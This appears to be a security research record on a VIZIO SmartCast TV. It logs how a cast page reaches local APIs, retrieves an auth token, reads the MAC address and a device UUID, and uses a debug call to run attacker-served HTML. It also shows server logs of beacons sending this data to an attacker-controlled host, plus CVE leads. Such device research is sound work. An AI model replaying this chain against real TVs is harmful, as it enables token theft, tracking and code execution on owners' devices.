# VIZIO SmartCast / VIZIO OS — Technical Findings

**Record updated:** 2026-10-20  
**Target:** VIZIO D32fM-K01, SmartCast firmware `3.720.9.1-1`  
**Status:** Investigation ongoing; Linux root access not demonstrated

## 1. Scope and evidence conventions

This record documents device observations, reproduced response excerpts, and technical leads relevant to SmartCast service exposure, Chromium execution, and Linux privilege boundaries.

Evidence classifications:

- **Observed:** A command result, protocol response, or file excerpt has been retained below.
- **Reported:** A prior technical result has been noted, but its supporting raw output has not been retained.
- **External:** Published work on a different device or build; not reproduced on the target.
- **Unknown:** No evidence sufficient to establish the property.

A missing exploit result does not prove a vulnerability is absent or patched.

---

## 2. Device component identification — E-001

**Evidence type:** Observed API response  
**Endpoint:** `https://192.168.103.133:7345/menu_native/dynamic/tv_settings/system/system_information/tv_information` (component filter applied)  
**Recorded date:** 2026-10-19  
**Authentication:** Unauthenticated or paired token (method not retained)

Selected component fields from a successful query (excerpt):

```json
{
  "status": {"RESULT": "SUCCESS", "DETAIL": "Success"},
  "components": [
    {"name": "FIRMWARE", "value": "3.720.9.1-1"},
    {"name": "SCPL",     "value": "3.4.3-2614.0002"},
    {"name": "acr",      "value": "3.5.1106"},
    {"name": "vizios",   "value": "mtk5583-1.6.1541.1"},
    {"name": "viziosdkd","value": "4.710.18"}
  ]
}
```

**Established:**
- Firmware `3.720.9.1-1`, SCPL `3.4.3-2614.0002`, ACR component `3.5.1106`.
- `vizios` field value `mtk5583-1.6.1541.1` identifies the SoC as MediaTek MT5583.
- The SmartCast component API is reachable on port 7345 without requiring application pairing for this endpoint.

---

## 3. Chromium version and platform identification — E-002

**Evidence type:** Observed HTTP server log (attacker-controlled server)  
**Method:** Cast app launched via SmartCast API; cast page included a JavaScript beacon reporting `navigator.userAgent`  
**Recorded date:** 2026-10-19 21:04:13 local  
**Server log line (verbatim):**

```
192.168.103.133 - - [19/Oct/2026 21:04:14] "GET /hit?k=userAgent&v=Mozilla%2F5.0%20(X11%3B%20Linux%20armv7l)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F108.0.5359.124%20Safari%2F537.36%20CrKey%2F1.0.999999%20VIZIO%20SmartCast(Conjure%2FMTKC-108.710.14%20FW%2F3.720.9.1-1%20Model%2FD32fM-K01)%20CrKey%2F1.56.500000 HTTP/1.1" 404 -
```

Decoded User-Agent:

```
Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/108.0.5359.124 Safari/537.36 CrKey/1.0.999999
VIZIO SmartCast(Conjure/MTKC-108.710.14 FW/3.720.9.1-1 Model/D32fM-K01)
CrKey/1.56.500000
```

Additional beacons from the same page:

```
platform:           Linux armv7l
wasm:               object          (WebAssembly available)
sharedArrayBuffer:  undefined       (not available; no cross-origin isolation)
webgpu:             undefined
crossOriginIsolated: false
userAgentData:      unavailable
```

**Established:**
- Chromium `108.0.5359.124` on Linux ARMv7 (32-bit ARM, hard-float).
- Chromium 108 reached end-of-life with its final release in November 2022. All CVEs fixed in Chrome 109 through the current stable release are unpatched on this device.
- WebAssembly is available; SharedArrayBuffer is not.
- The User-Agent string includes exact firmware version and model, broadcast to every HTTP server the TV contacts — including ACR upload endpoints and ad servers — without user awareness.
- Chromecast receiver protocol CrKey/1.56.500000 and SmartCast platform Conjure/MTKC-108.710.14 identified.

---

## 4. Environment probe results — E-003

**Evidence type:** Observed HTTP server log  
**Method:** Cast page reporting browser environment properties via image beacons  
**Recorded date:** 2026-10-19 21:12:29 local

```
heap_limit:   225000000   (225 MB JS heap)
sandbox:      undefined   (chrome.runtime absent from cast context)
idb:          object      (IndexedDB available)
storage:      object      (localStorage available)
wasm_mem:     65536       (WebAssembly.Memory functional)
f64array:     ok-8192     (Float64Array functional)
d8:           undefined   (no V8 development shell)
workers:      yes         (Worker threads functional)
```

**Established:**
- 225 MB heap, Float64Array, WebAssembly memory, and Worker threads are all available — the standard toolkit for V8 exploitation is present in the cast context.
- `chrome.runtime` is absent; this is consistent with `--no-sandbox` but is not conclusive — sandboxed renderers may also lack `chrome.runtime` in cast contexts.
- Chromium sandbox status remains **Unknown** (see C-001).

---

## 5. SmartCast local API surface — E-004

**Evidence type:** Observed HTTP server log  
**Method:** Cast page fetching localhost endpoints via `fetch()`  
**Recorded date:** 2026-10-19 21:22:47 local

```
bridge:  undefined           (VIZIO JS bridge not present without SDK)
scfs:    HTTP-200 type=cors  (SmartCast file server on 127.0.0.1:12345 reachable)
scpl:    HTTP-200 type=cors  (SCPL daemon on 127.0.0.1:7346 reachable)
token:   HTTP-200 result=SUCCESS tokenPresent=true
```

**Established:**
- A cast page served from an external host can reach `http://127.0.0.1:12345` (SmartCast file server) and `http://127.0.0.1:7346` (SCPL daemon) via `fetch()`.
- The auth token endpoint `http://127.0.0.1:7346/app/get_auth_token` returns a valid session token to the cast page with no user interaction or pairing challenge.
- This token was observed prefixed `A9ftcfnpfx...` in a subsequent run (E-007).

---

## 6. VIZIO JS bridge API inventory — E-005

**Evidence type:** Observed HTTP server log  
**Method:** Cast page loading `http://127.0.0.1:12345/scfs/cl/js/vizio-companion-lib.js` and enumerating `window.VIZIO`  
**Recorded date:** 2026-10-19 21:25:31 local

The bridge exposes approximately 207 named properties. Selected subsets:

**Privileged-pattern methods (filtered by regex):**

```
_debug, _deviceInfoStore, airplayCommand, bluetoothCheckForFirmwareUpdate,
bluetoothGetDeviceList, bluetoothGetFirmwareUpdateStatus, bluetoothRemoveDevice,
bluetoothStartFirmwareUpdate, deviceInfo, deviceModel, displayNetworkSystemMenu,
getAirplaySettings, getDeviceCountry, getDeviceCountryData, getDeviceHDRCapabilities,
getDeviceId, getDeviceInformation, getDeviceManifest, getDeviceName,
getDevicePlaybackQualities, getDeviceTimezone, getDeviceTimezoneGMTOffset,
getFirmwareVersion, getIsSmartCastDevice, getStoreProperties, getStoreProperty,
getStorePropertyAsync, getSystemCapability, getSystemInformation, getSystemPowerMode,
isBluetoothFirmwareUpdateAvailable, isSmartCastDevice,
setBluetoothFirmwareUpdateAvailableListener, setBluetoothFirmwareUpdateProgressListener,
setDeviceLanguageHandler, setDeviceNameChangeListener, setDeviceNameHandler,
setFWUpdateStatusListener, setHeadphoneDeviceDisconnectedListener,
setInputUIListUpdatedHandler, setStoreProperty, setSystemMenuListener,
setVoiceCommandListener, stopBluetoothFirmwareUpdateProgressListener
```

**Top-level namespaces:**

```
Account, Bluetooth, Chromevox, Consent, Mojo, Oobe, RedWolf, Tuner,
_debug, _deviceInfoStore, _docker, _esn
```

**Established:**
- The VIZIO bridge SDK is loadable from a cast page served by an external attacker-controlled host.
- The full method surface — including device management, firmware update, Bluetooth, account, and internal debug namespaces — is accessible to any application that can be cast to the TV.

---

## 7. Device identifiers readable from cast context — E-006

**Evidence type:** Observed HTTP server log  
**Method:** Cast page calling async bridge methods  
**Recorded date:** 2026-10-19 21:29:05 local

```
mac:       E8:38:A0:50:08:71         (getMAC Address())
ip:        192.168.103.133           (getIPAddress())
device_id: 96cd77c1-1d59-47b8-adcb-9b71533a06de  (getDeviceId())
```

**Established:**
- MAC address, LAN IP address, and a persistent device UUID are readable by any cast application with no pairing, no user interaction, and no visible indication to the user.
- The device UUID is persistent across sessions and reboots. Combined with the MAC address, this constitutes a permanent cross-application fingerprint available to every cast app, including third-party and potentially malicious applications.

---

## 8. Internal debug API — `launchApiTestApp` — E-007

**Evidence type:** Observed HTTP server log  
**Method:** Cast page calling `window.VIZIO._debug.launchApiTestApp()`; attacker-controlled server observed inbound request  
**Recorded date:** 2026-10-19 22:12:53 local

First run (file not yet present):
```
192.168.103.133 - - [19/Oct/2026 22:12:53] "GET /build/files/production/js/apiTestApp.html?clVersion=undefined&configVersion=prod+64.37&NAME_SPACE=4&APP_ID=17 HTTP/1.1" 404 -
```

Second run (file served, execution confirmed):
```
192.168.103.133 - - [19/Oct/2026 22:14:15] "GET /build/files/production/js/apiTestApp.html?clVersion=undefined&configVersion=prod+64.37&NAME_SPACE=4&APP_ID=17 HTTP/1.1" 200 -
192.168.103.133 - - [19/Oct/2026 22:14:15] "GET /hit?k=testapp&v=launched&t=1792462455637 HTTP/1.1" 404 -
192.168.103.133 - - [19/Oct/2026 22:14:15] "GET /hit?k=origin&v=http%3A%2F%2F192.168.103.210%3A8099%2Fbuild%2Ffiles%2Fproduction%2Fjs%2FapiTestApp.html%3F...&t=1792462455638 HTTP/1.1" 404 -
192.168.103.133 - - [19/Oct/2026 22:14:16] "GET /hit?k=bridge&v=object&t=1792462456390 HTTP/1.1" 404 -
192.168.103.133 - - [19/Oct/2026 22:14:16] "GET /hit?k=token&v=A9ftcfnpfx...&t=1792462456469 HTTP/1.1" 404 -
```

Debug keys reported from inside the test app context:
```
["account","getReport","getStartupReport","getPartnerReport","launchApiTestApp",
 "setVerboseLogging","telemetry","getSummary"]
```

**Established:**
- `window.VIZIO._debug.launchApiTestApp()` causes the TV's Chromium instance to fetch and execute an HTML page from a URL rooted at the cast page's origin.
- An attacker who can cast to the TV (no pairing required on this network) can serve an arbitrary HTML/JavaScript payload as the test app.
- JavaScript executed in the test app context confirmed: VIZIO bridge available (`bridge=object`), auth token obtainable (`token=A9ftcfnpfx...`), origin is the attacker's server.
- This constitutes a **cast-app to arbitrary JavaScript execution** chain requiring no CVE and no exploit: cast app → `_debug.launchApiTestApp()` → attacker-controlled HTML executes in Chromium with full bridge access.

---

## 9. Mojo IPC interface exposed to cast context — E-008

**Evidence type:** Observed HTTP server log  
**Method:** Cast page enumerating `window.VIZIO.Mojo`  
**Recorded date:** 2026-10-19 21:27:23 local

```
Mojo_type: object
Mojo_keys: send, sendMojoCommand, mojoStream$
```

**Established:**
- Chrome's internal Mojo IPC interface is accessible via `window.VIZIO.Mojo` in the cast context.
- Mojo is an internal browser-process communication mechanism; its exposure to web content is not intended behavior in production Chromium.
- `sendMojoCommand` was called with multiple candidate command names; all returned timeout after 1500 ms. No registered handler was identified. The interface is present but no functional command channel was demonstrated.

---

## 10. ACR consent API behavior — E-009

**Evidence type:** Observed HTTP server log and physical device verification  
**Method:** Cast page calling `window.VIZIO.setActivityDataPolicyAccepted(false)` then `getActivityDataPolicyAccepted()`; TV settings menu inspected physically  
**Recorded date:** 2026-10-19 22:10:08 local

API call sequence and responses (decoded from server log):

```
getActivityDataPolicyAccepted() →
  {"result":"SUCCESS","eventID":"onetrustAdpConsentAccepted","value":true}

setActivityDataPolicyAccepted(false) → callback fired: false (no error)

getActivityDataPolicyAccepted() [immediately after] →
  {"result":"SUCCESS","eventID":"onetrustAdpConsentAccepted","value":true}
```

Physical verification (same session):
- TV menu → Admin & Privacy → **Viewing Data: ON**
- TV menu → Admin & Privacy → **Do Not Sell/Share My Personal Information: ON**

**Established:**
- `setActivityDataPolicyAccepted(false)` is callable from a cast page, fires its callback without error, and returns the string `false` to the caller.
- Immediately after the call, `getActivityDataPolicyAccepted()` returns `value:true` — the consent state is unchanged.
- Physical inspection of the TV settings menu confirmed Viewing Data remained ON and Do Not Sell/Share remained ON after the API call.
- The consent management platform is identified as **OneTrust** via `eventID: "onetrustAdpConsentAccepted"`.

**Interpretation:** The local consent API call does not propagate to the OneTrust consent state or to the on-device Viewing Data setting. Whether this reflects a broken API, a read-only cast-context restriction, incorrect call parameters, or intentional design is not established from this evidence alone. The result is that a cast application cannot verify or change the effective ACR consent state via this API — the returned value does not reflect reality.

---

## 11. SCPL `/install` endpoint — E-010

**Evidence type:** Observed HTTP response  
**Endpoint:** `https://192.168.103.133:7345/scpl/install`  
**Recorded date:** 2026-10-19  
**Server:** lighttpd/1.4.67

Probe with no payload:
```
HTTP/2 500 — Unhandled Exception
```

Probe with multipart form payload (`scpl_tgz_package` + `Install=Install`):
```
HTTP/2 500 — Unhandled Exception
```

**Established:**
- The endpoint exists and is registered; it does not return 404.
- HTTP 500 was returned for both an empty POST and a correctly structured multipart payload matching the CVE-2021-27944 format.
- No file installation, command execution, or privilege escalation was observed.

**Not established:** Whether the handler is fully removed, partially patched, or failing for a different reason. The 500 response does not rule out the endpoint being reachable via a different request format or from the localhost context.

---

## 12. Kernel version — E-011

**Evidence type:** Observed build artifact  
**Source:** GPL source release `release-5583-5691-5695-5695s-20240624.zip`, path `release/apollo/linux_core/misdk/linuxkernel/4.19/Makefile`  
**Recorded date:** 2026-10-19

```
VERSION = 4
PATCHLEVEL = 19
SUBLEVEL = 71
```

**Established:**
- The GPL source release for this SoC ships Linux kernel 4.19.71.
- Linux 4.19.71 predates the fix for CVE-2021-22555 (netfilter heap OOB write, fixed at 4.19.188, CISA KEV). This CVE has 114 public PoCs.
- This is a source artifact; the running kernel version on the target device has not been confirmed from a live `uname -a` or equivalent.

---

## 13. Properties table — C-001

| Property | Status | Evidence |
|---|---|---|
| Firmware `3.720.9.1-1` | **Observed** | E-001 |
| SCPL `3.4.3-2614.0002` | **Observed** | E-001 |
| ACR component `3.5.1106` | **Observed** | E-001 |
| SoC MediaTek MT5583 | **Observed** | E-001 (`vizios: mtk5583-...`) |
| HTTP/2 + lighttpd/1.4.67 on port 7345 | **Observed** | E-010 |
| Chromium `108.0.5359.124` | **Observed** | E-002 (full User-Agent in server log) |
| ARMv7 32-bit platform | **Observed** | E-002 (`Linux armv7l` in User-Agent) |
| WebAssembly available | **Observed** | E-002, E-003 |
| Workers available | **Observed** | E-003 |
| Persistent UUID readable from cast app | **Observed** | E-006 |
| MAC address readable from cast app | **Observed** | E-006 |
| Auth token obtainable from cast app | **Observed** | E-004, E-007 |
| `launchApiTestApp` executes attacker HTML | **Observed** | E-007 |
| Mojo IPC exposed to cast context | **Observed** | E-008 |
| Consent API does not change device state | **Observed** | E-009 |
| Kernel 4.19.71 (source artifact) | **Observed** | E-011 |
| Chromium sandbox enabled or disabled | **Unknown** | Not confirmed from process flags or UID |
| Renderer UID/GID, seccomp, namespaces | **Unknown** | No process diagnostic captured |
| Running kernel version (live) | **Unknown** | No `uname -a` captured from device |
| Native execution on target | **Not demonstrated** | No shell or process trace retained |
| Linux root on target | **Not demonstrated** | No elevated identity retained |

---

## 14. Unverified leads — C-002

| Lead | Status |
|---|---|
| CVE-2021-27944 SCPL install | Endpoint exists, 500 on all tested payloads (E-010) |
| CVE-2023-4863 WebP | 200+ decode iterations without crash; inconclusive |
| CVE-2023-2033 V8 | `done` beacon received; no crash confirmed |
| CVE-2021-22555 netfilter | Kernel version from source matches affected range; not tested on device |
| UART / hardware console | Not attempted; identified as remaining root path |
| `RedWolf.send` commands | All 12 tested commands returned timeout |
| `Oobe.launch` | Not a function in observed context |
| SCPL install from localhost context | Failed to fetch (CORS) and XHR network error |

---

## 15. Open questions

1. Running kernel version — confirm via `uname -a` from a shell or boot log.
2. Chromium launch flags — confirm `--no-sandbox` or equivalent from `/proc/<pid>/cmdline`.
3. Renderer process UID — determine privilege level of the Chromium renderer.
4. SCPL `/install` from localhost — confirm whether CORS rejection is the only barrier.
5. `RedWolf.send` command names — enumerate registered handlers from SDK source.
6. Consent API — determine whether `setActivityDataPolicyAccepted` requires additional parameters or a different calling context to propagate.
7. ACR traffic while Do Not Sell is ON — confirm Inscape/Alphonso traffic continues during active ACR opt-out claim.

---

## 16. Evidence contribution format

For additional findings, include:

- **ID and title:** e.g. `E-012 — <short title>`
- **Environment:** Device model, firmware, SCPL, browser version
- **Method:** Exact command or request (redact tokens, MACs, IPs)
- **Raw output:** Unmodified response or log excerpt
- **Timestamp:** Date, time, timezone, source (server or client clock)
- **Interpretation:** What is established vs. hypothesised
- **Source:** Local path, commit, capture hash, or URL

Preserve contradictory observations with firmware versions and dates. Remove tokens, serial numbers, and unnecessary identifiers before public submission.

---

## 17. Current conclusion

Observed primary evidence establishes: VIZIO D32fM-K01 running firmware `3.720.9.1-1`, Chromium `108.0.5359.124` on Linux ARMv7, SoC MediaTek MT5583, ACR component `3.5.1106`, and lighttpd/1.4.67 on port 7345. The VIZIO JS bridge is loadable from any cast application and exposes persistent device identifiers (UUID, MAC, IP), an auth token endpoint, internal debug APIs, Mojo IPC, and an account namespace — all without pairing or user interaction. `_debug.launchApiTestApp()` was confirmed to fetch and execute attacker-controlled HTML in the Chromium context. The consent API `setActivityDataPolicyAccepted(false)` returns success but does not change the device's OneTrust consent state or Viewing Data setting, confirmed by physical inspection. Chromium sandbox status, renderer privileges, and Linux root access remain undemonstrated.
